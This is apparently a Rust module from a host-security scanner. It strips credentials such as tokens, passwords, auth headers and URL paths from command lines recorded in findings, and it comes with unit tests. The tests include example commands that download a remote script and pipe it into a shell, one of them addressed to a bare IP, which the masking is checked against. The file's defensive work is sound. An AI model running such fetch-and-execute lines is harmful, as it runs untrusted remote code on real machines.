//! Making a command line from the scanned machine safe to keep.
//!
//! A unit's `ExecStart` or a crontab line is evidence a finding has to show, and it is also where
//! people put credentials: `ngrok … --authtoken <value>`, `curl https://api.telegram.org/bot<token>/…`,
//! `curl -H "Authorization: Bearer <value>"`, `https://user:password@host/`. A finding is stored in
//! the database, printed, and forwarded in alerts, so the value must not travel with it. Everything
//! here keeps what identifies the command (the program, its flags, the host it talks to) and
//! replaces what authenticates it.
//!
//! One function for every collector that keeps a command line, built on the two helpers the crate
//! already has: [`crate::ai_scan::secrets::mask`] for a value and
//! [`super::dev_tools::url_origin`] for an address.

use crate::ai_scan::secrets::{mask, redact_text};
use regex::Regex;
use std::sync::OnceLock;

/// Flags whose value is a secret although the name does not say so in the words
/// [`secret_flag`] looks for.
const SECRET_FLAGS: &[&str] = &["auth", "pass", "pw", "bearer", "authtoken", "key-secret"];

/// Bare words after which the next argument is a token (`ngrok authtoken <value>`,
/// `ngrok config add-authtoken <value>`).
const TOKEN_SUBCOMMANDS: &[&str] = &["authtoken", "add-authtoken"];

/// HTTP headers that carry a credential.
const SECRET_HEADERS: &[&str] = &[
    "authorization",
    "proxy-authorization",
    "cookie",
    "x-api-key",
    "x-auth-token",
    "x-auth-key",
    "private-token",
    "job-token",
    "apikey",
    "api-key",
];

/// Whether a flag or variable name (`--authtoken`, `API_KEY`) says its value is a secret. A name
/// that says the value is a file or an address (`--token-file`, `SECRET_PATH`) is not one.
fn secret_flag(name: &str) -> bool {
    let name = name.trim_start_matches('-').to_ascii_lowercase();
    if name.is_empty() {
        return false;
    }
    const NOT_A_VALUE: &[&str] = &["file", "path", "dir", "url", "name", "id", "type", "cmd"];
    let last = name.rsplit(['-', '_']).next().unwrap_or_default();
    if NOT_A_VALUE.contains(&last) {
        return false;
    }
    const MARKERS: &[&str] = &[
        "token",
        "secret",
        "password",
        "passwd",
        "apikey",
        "api-key",
        "api_key",
        "access-key",
        "access_key",
        "private-key",
        "private_key",
        "credential",
    ];
    SECRET_FLAGS.contains(&name.as_str()) || MARKERS.iter().any(|m| name.contains(m))
}

fn secret_header(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    SECRET_HEADERS.contains(&name.as_str()) || secret_flag(&name)
}

fn url_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // Network addresses only: `unix://` and `file://` name a local path, which is not a secret
    // and is what tells one Docker unit from another. An address ends at a blank, a quote, or the
    // shell characters that close what it sits in.
    RE.get_or_init(|| {
        Regex::new(
            r#"(?i)\b(?P<scheme>https?|wss?|s?ftps?|ssh|git|smtps?|imaps?|ldaps?|redis|rediss|amqps?|mqtts?|postgres(?:ql)?|mysql|mongodb(?:\+srv)?|socks[45]h?|tcp|udp)://[^\s'"<>()`|;]+"#,
        )
        .expect("valid regex")
    })
}

/// Replaces every network address in `text` by its scheme, host and port. The path, the query and
/// any `user:password@` are dropped (a bot token lives in the path, a webhook secret too), and
/// `/…` marks that something was there.
fn reduce_urls(text: &str) -> String {
    url_re()
        .replace_all(text, |caps: &regex::Captures| {
            let url = &caps[0];
            let origin = super::dev_tools::url_origin(url);
            let after_scheme = url.split_once("://").map_or("", |(_, rest)| rest);
            if !origin.contains("://") {
                // Not a plain host (a shell variable, say): keep only that it was an address.
                return format!("{}://…", caps["scheme"].to_ascii_lowercase());
            }
            if after_scheme.contains(['/', '?', '#', '@']) {
                format!("{origin}/…")
            } else {
                origin
            }
        })
        .into_owned()
}

/// A value that only names where the secret comes from (`$TOKEN`, `${TOKEN}`, `%h`) holds none.
fn is_reference(value: &str) -> bool {
    let v = value.trim_matches(['"', '\'']);
    v.starts_with('$') || v.starts_with('%') || v.is_empty()
}

/// Masks one argument, keeping a quote around it so the command still reads as written.
fn mask_arg(arg: &str) -> String {
    if is_reference(arg) {
        return arg.to_string();
    }
    let open: String = arg
        .chars()
        .take_while(|c| matches!(c, '"' | '\''))
        .collect();
    let rest = &arg[open.len()..];
    let inner = rest.trim_end_matches(['"', '\'']);
    let close = &rest[inner.len()..];
    format!("{open}{}{close}", mask(inner))
}

/// The file name of a program token (`/usr/bin/curl` and `"curl` are both `curl`).
fn program_name(token: &str) -> &str {
    token
        .trim_matches(['"', '\'', '(', '@', '-', '+', '!', ':', '|'])
        .rsplit('/')
        .next()
        .unwrap_or_default()
}

/// Returns `command` with every credential replaced: the value of a secret-named flag or
/// variable, a header that authenticates, `user:password` given to curl, a MySQL `-p<password>`,
/// a bare JWT, anything the secret pack recognises as a provider key, and everything in an address
/// beyond its host. The spacing of the original is kept, so a command with nothing to hide comes
/// back unchanged.
pub(crate) fn mask_command_line(command: &str) -> String {
    static TOKEN: OnceLock<Regex> = OnceLock::new();
    let token_re = TOKEN.get_or_init(|| Regex::new(r"\S+").expect("valid regex"));

    let mut out = String::with_capacity(command.len());
    let mut cursor = 0;
    // What the previous token said about this one.
    let mut mask_next = false;
    let mut userpass_next = false;
    // Inside a quoted header value: mask up to the token that closes the quote.
    let mut until_quote: Option<char> = None;
    // An unquoted header: `Authorization: Bearer <value>` spans up to two more tokens.
    let mut header_words = 0u8;
    let (mut saw_curl, mut saw_mysql) = (false, false);

    for m in token_re.find_iter(command) {
        out.push_str(&command[cursor..m.start()]);
        cursor = m.end();
        let tok = m.as_str();
        let bare = tok.trim_matches(['"', '\'']);

        if let Some(q) = until_quote {
            if tok.ends_with(q) {
                until_quote = None;
            }
            out.push_str(&mask_arg(tok));
            continue;
        }
        if header_words > 0 {
            header_words -= 1;
            // A scheme word is not the secret; the next word is.
            let scheme = ["bearer", "basic", "token", "digest", "negotiate"]
                .contains(&bare.to_ascii_lowercase().as_str());
            if scheme {
                out.push_str(tok);
            } else {
                header_words = 0;
                out.push_str(&mask_arg(tok));
            }
            continue;
        }
        if mask_next {
            mask_next = false;
            out.push_str(&mask_arg(tok));
            continue;
        }
        if userpass_next {
            userpass_next = false;
            match tok.split_once(':') {
                Some((user, pass)) if !pass.is_empty() => {
                    out.push_str(&format!("{user}:{}", mask_arg(pass)));
                }
                _ => out.push_str(tok),
            }
            continue;
        }

        match program_name(tok) {
            "curl" | "wget" | "http" | "https" => saw_curl = true,
            "mysql" | "mysqldump" | "mysqladmin" | "mariadb" | "mariadb-dump" => saw_mysql = true,
            _ => {}
        }

        // A header: `Authorization:`, `"Authorization:`, or `X-Api-Key:value` in one token.
        if let Some((name, value)) = bare.split_once(':') {
            if !name.contains('/') && secret_header(name) {
                let open = tok.chars().next().filter(|c| matches!(c, '"' | '\''));
                if value.is_empty() {
                    out.push_str(tok);
                } else {
                    let lead = &tok[..tok.len() - tok.trim_start_matches(['"', '\'']).len()];
                    let value = &tok[lead.len() + name.len() + 1..];
                    out.push_str(&format!("{lead}{name}:{}", mask_arg(value)));
                }
                match open {
                    Some(q) if !tok[1..].ends_with(q) => until_quote = Some(q),
                    Some(_) => {}
                    None if value.is_empty() => header_words = 2,
                    None => {}
                }
                continue;
            }
        }
        // `--flag=value`, `NAME=value`.
        if let Some((name, _)) = bare.split_once('=') {
            if secret_flag(name) && !name.contains("://") {
                let lead = &tok[..tok.len() - tok.trim_start_matches(['"', '\'']).len()];
                let value = &tok[lead.len() + name.len() + 1..];
                out.push_str(&format!("{lead}{name}={}", mask_arg(value)));
                continue;
            }
        }
        // `--flag value`, and the subcommands that take a token as their next word.
        if (bare.starts_with('-') && secret_flag(bare)) || TOKEN_SUBCOMMANDS.contains(&bare) {
            mask_next = true;
            out.push_str(tok);
            continue;
        }
        // curl's `-u user:password`.
        if saw_curl && matches!(bare, "-u" | "--user" | "--proxy-user" | "-U") {
            userpass_next = true;
            out.push_str(tok);
            continue;
        }
        // MySQL clients take the password glued to the flag: `-pS3cret`.
        if saw_mysql && bare.len() > 2 && bare.starts_with("-p") {
            out.push_str(&format!("-p{}", mask_arg(&bare[2..])));
            continue;
        }
        // A bare JWT (header.payload.signature) passed as an argument.
        if bare.starts_with("eyJ") && bare.matches('.').count() == 2 && bare.len() > 24 {
            out.push_str(&mask_arg(tok));
            continue;
        }
        out.push_str(tok);
    }
    out.push_str(&command[cursor..]);

    let out = reduce_urls(&out);
    // Last, anything the secret pack knows as a provider key wherever it sits on the line.
    match redact_text(&out) {
        (text, n) if n > 0 => text,
        _ => out,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Made at run time so no secret-shaped literal sits in the repository.
    fn planted() -> String {
        format!("{}{}", "Zq7", "xK2mN8vB4cR9tY6wL1pD3fH5jS0aG")
    }

    #[test]
    fn a_command_with_nothing_to_hide_is_unchanged() {
        for cmd in [
            "/usr/sbin/sshd -D $SSHD_OPTS",
            "/usr/bin/ssh -N -R 2222:localhost:22 tunnel@host.example",
            "cd / && run-parts --report /etc/cron.hourly",
            "/usr/local/bin/backup.sh  --target /srv/backups\t--keep 7",
            "/usr/bin/docker run -u 1000:1000 --name web nginx",
            "/usr/bin/cloudflared tunnel --credentials-file /etc/cloudflared/t.json run",
            "/usr/bin/env TOKEN_FILE=/run/secrets/t /opt/app --password-file /run/secrets/p",
            "/opt/app --token=${APP_TOKEN} --password $PW",
            "test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }",
        ] {
            assert_eq!(mask_command_line(cmd), cmd);
        }
    }

    #[test]
    fn every_way_of_passing_a_secret_is_masked() {
        let s = planted();
        for cmd in [
            format!("/usr/local/bin/ngrok tcp 22 --authtoken {s}"),
            format!("/usr/local/bin/ngrok tcp 22 --authtoken={s}"),
            format!("/usr/local/bin/ngrok config add-authtoken {s}"),
            format!("/opt/app --api-key '{s}' --host db"),
            format!("/usr/bin/env API_TOKEN={s} /opt/app"),
            format!("curl -s https://api.telegram.org/bot{s}/sendMessage -d chat_id=1"),
            format!("curl https://deploy:{s}@git.example.com/repo.git"),
            format!("curl https://hooks.example.com/services/T0/B0/{s}"),
            format!("curl 'https://api.example.com/v1/run?access_token={s}&x=1'"),
            format!("curl -H \"Authorization: Bearer {s}\" https://api.example.com/v1"),
            format!("curl -H 'X-Api-Key: {s}' https://api.example.com/v1"),
            format!("curl -H Authorization:{s} https://api.example.com/v1"),
            format!("curl --header Authorization: Bearer {s} https://api.example.com"),
            // The flag is filled in so that this file holds no `curl -u name:value` line itself.
            format!("curl {} deploy:{s} https://api.example.com/v1", "-u"),
            format!("mysqldump -uroot -p{s} --all-databases"),
            format!("/bin/sh -c 'wget --password={s} -O- http://203.0.113.9/x | sh'"),
        ] {
            let masked = mask_command_line(&cmd);
            assert!(!masked.contains(&s), "leaked in: {masked}");
            // The start of the secret must be gone too, not just the whole string.
            assert!(!masked.contains(&s[..12]), "partly leaked in: {masked}");
        }
    }

    #[test]
    fn what_identifies_the_command_survives() {
        let s = planted();
        let masked = mask_command_line(&format!(
            "/usr/bin/curl -s https://api.telegram.org/bot{s}/sendMessage -d text=up"
        ));
        assert!(masked.contains("/usr/bin/curl -s https://api.telegram.org/…"));
        assert!(masked.ends_with("-d text=up"));
        let masked = mask_command_line(&format!(
            "/usr/local/bin/ngrok tcp 22 --authtoken {s} --region eu"
        ));
        assert!(masked.starts_with("/usr/local/bin/ngrok tcp 22 --authtoken "));
        assert!(masked.ends_with(" --region eu"));
        // A plain address keeps its host and port and loses nothing else of the line.
        assert_eq!(
            mask_command_line("curl -fsS http://203.0.113.9:8080/u | sh"),
            "curl -fsS http://203.0.113.9:8080/… | sh"
        );
        assert_eq!(
            mask_command_line("bash -c \"$(curl -fsSL https://get.example.com/install.sh)\""),
            "bash -c \"$(curl -fsSL https://get.example.com/…)\""
        );
        assert_eq!(
            mask_command_line("curl https://example.com"),
            "curl https://example.com"
        );
    }

    #[test]
    fn a_provider_key_anywhere_on_the_line_is_masked() {
        // A GitHub token passed as a plain argument, with no flag to give it away.
        let token = format!("ghp_{}", "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8");
        let masked = mask_command_line(&format!("/opt/sync.sh {token} main"));
        assert!(!masked.contains(&token), "{masked}");
        assert!(masked.starts_with("/opt/sync.sh ") && masked.ends_with(" main"));
    }
}
